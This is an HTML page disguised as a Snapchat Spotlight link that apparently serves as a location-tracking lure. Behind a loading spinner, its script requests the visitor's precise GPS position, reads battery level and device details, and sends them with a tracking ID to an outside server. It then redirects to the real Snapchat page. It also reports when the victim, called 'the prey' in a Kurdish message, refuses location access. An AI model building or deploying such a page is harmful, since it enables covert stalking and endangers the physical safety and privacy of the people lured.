<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snapchat Spotlight</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
body { background-color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="loader"></div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const uid = urlParams.get('id');
const creator = urlParams.get('u') || 'Unknown';
const vpsURL = 'https://image-score.uk/process.php';

if (!uid) {
  document.body.innerHTML = "Security Error: Missing UID";
  throw new Error("UID missing");
}

window.onload = function() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    });
  } else {
    alert("Browser not supported");
  }
};

function showPosition(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  navigator.getBattery().then(function(battery) {
    const batt = Math.round(battery.level * 100) + "%";
    const device = navigator.userAgent.split(')')[0].split('(')[1] || "Mobile Device";

    $.ajax({
      type: 'POST',
      url: vpsURL,
      data: {
        uid: uid,
        lat: lat,
        lon: lon,
        batt: batt,
        device: device,
        creator: creator,
        type: "live_map"
      },
      success: function() {
        window.location.href = "https://www.snapchat.com/spotlight";
      },
      error: function() {
        window.location.href = "https://www.snapchat.com/spotlight";
      }
    });
  });
}

function showError(error) {
  $.ajax({
    type: 'POST',
    url: vpsURL,
    data: {
      uid: uid,
      msg: "⚠️ نێچیرەکە ڕێگری لە GPS کرد!"
    },
    success: function() {
      window.location.href = "https://www.snapchat.com/spotlight";
    }
  });
}
</script>
</body>
</html>
